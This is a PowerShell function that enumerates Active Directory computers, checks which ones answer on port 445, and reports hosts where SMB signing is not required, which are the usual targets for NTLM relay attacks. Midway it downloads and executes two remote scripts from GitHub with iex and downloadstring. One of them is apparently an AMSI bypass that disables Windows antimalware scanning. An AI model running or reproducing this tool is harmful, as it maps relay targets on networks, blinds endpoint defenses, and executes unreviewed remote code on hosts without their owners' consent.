function CheckSMBSigning
{
	
	[CmdletBinding()] Param(
		
		[Parameter (Mandatory=$False, Position = 0, ValueFromPipeline=$true)]
		[String]
		$Targets,

  		[Parameter (Mandatory=$False, Position = 1, ValueFromPipeline=$true)]
	        [String]
	        $Domain,

  		[Parameter (Mandatory=$False, Position = 2, ValueFromPipeline=$true)]
	        [String]
	        $OutputFile
	
	)
	
	Write-Output ""
	
	$ErrorActionPreference = "SilentlyContinue"
	
	Write-Output " Checking Hosts..."

 	if($Targets){
  		$Computers = $Targets
    		$Computers = $Computers -split ","
	}
  	else{
		if($Domain){
  			$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
			$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain")
   			$objSearcher.PageSize = 1000
			$objSearcher.Filter = "(&(sAMAccountType=805306369))"
			$Computers = $objSearcher.FindAll() | %{$_.properties.dnshostname}
		}

    		else{
			# Get a list of all the computers in the domain
			$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
			$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
   			$objSearcher.PageSize = 1000
			$objSearcher.Filter = "(&(sAMAccountType=805306369))"
			$Computers = $objSearcher.FindAll() | %{$_.properties.dnshostname}
			
			$currentdomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }
			$Computers = $Computers | Where-Object {-not ($_ -cmatch "$env:computername")}
			$Computers = $Computers | Where-Object {-not ($_ -match "$env:computername")}
			$Computers = $Computers | Where-Object {$_ -ne "$env:computername"}
			$Computers = $Computers | Where-Object {$_ -ne "$env:computername.$currentdomain"}
  		}

 	}

  	$Computers = $Computers | Where-Object { $_ -and $_.trim() }
	
	# Initialize the runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
        $runspacePool.Open()

        # Define the script block outside the loop for better efficiency
        $scriptBlock = {
            param ($computer)
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($computer, 445, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
            if ($wait) {
                try {
                    $tcpClient.EndConnect($asyncResult)
                    return $computer
                } catch {}
            }
            $tcpClient.Close()
            return $null
        }

        # Use a generic list for better performance when adding items
        $runspaces = New-Object 'System.Collections.Generic.List[System.Object]'

        foreach ($computer in $Computers) {
            $powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
            $powerShellInstance.RunspacePool = $runspacePool
            $runspaces.Add([PSCustomObject]@{
                Instance = $powerShellInstance
                Status   = $powerShellInstance.BeginInvoke()
            })
        }

        # Collect the results
        $reachable_hosts = @()
        foreach ($runspace in $runspaces) {
            $result = $runspace.Instance.EndInvoke($runspace.Status)
            if ($result) {
                $reachable_hosts += $result
            }
        }

        # Update the $Computers variable with the list of reachable hosts
        $Computers = $reachable_hosts

        # Close and dispose of the runspace pool for good resource management
        $runspacePool.Close()
        $runspacePool.Dispose()
	
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-SMBSigning.ps1')
	
	# foreach($reachable_host in $reachable_hosts){Invoke-SMBEnum -Target $reachable_host -Action All}
	
	if($reachable_hosts.Count -eq 1) {
		$smbsigningnotrequired = Get-SMBSigning -DelayJitter 10 -Target $reachable_hosts | Select-String "SMB signing is not required"
		$smbsigningnotrequired = ($smbsigningnotrequired | Out-String) -split "`n"
		$smbsigningnotrequired = $smbsigningnotrequired.Trim()
		$smbsigningnotrequired = $smbsigningnotrequired | Where-Object { $_ -ne "" }
		$smbsigningnotrequired = $smbsigningnotrequired | ForEach-Object { $_.ToString().Replace("SMB signing is not required on ", "") }
	}
	
	else{
		$formatted_hosts = '"' + ($reachable_hosts -join '","') + '"'
		$smbsigningnotrequired = Invoke-Expression "Get-SMBSigning -DelayJitter 10 -Targets @($formatted_hosts)" | Select-String "SMB signing is not required"
		$smbsigningnotrequired = ($smbsigningnotrequired | Out-String) -split "`n"
		$smbsigningnotrequired = $smbsigningnotrequired.Trim()
		$smbsigningnotrequired = $smbsigningnotrequired | Where-Object { $_ -ne "" }
		$smbsigningnotrequired = $smbsigningnotrequired | ForEach-Object { $_.ToString().Replace("SMB signing is not required on ", "") }
	}

 	if($smbsigningnotrequired){

  		if($OutputFile){$smbsigningnotrequired | Out-File $OutputFile -Encoding UTF8}
    		else{$smbsigningnotrequired | Out-File $pwd\SMBSigningNotRequired.txt -Encoding UTF8}
		
		Write-Output ""
		Write-Output " SMB Signing not required:"
		Write-Output ""
		$smbsigningnotrequired
		Write-Output ""
		if($OutputFile){Write-Output " Output saved to: $OutputFile"}
  		else{Write-Output " Output saved to: $pwd\SMBSigningNotRequired.txt"}
		Write-Output ""
  	}

    	else{
     		Write-Output " No hosts found where SMB-Signing is not required."
	  	Write-Output ""
	}
}
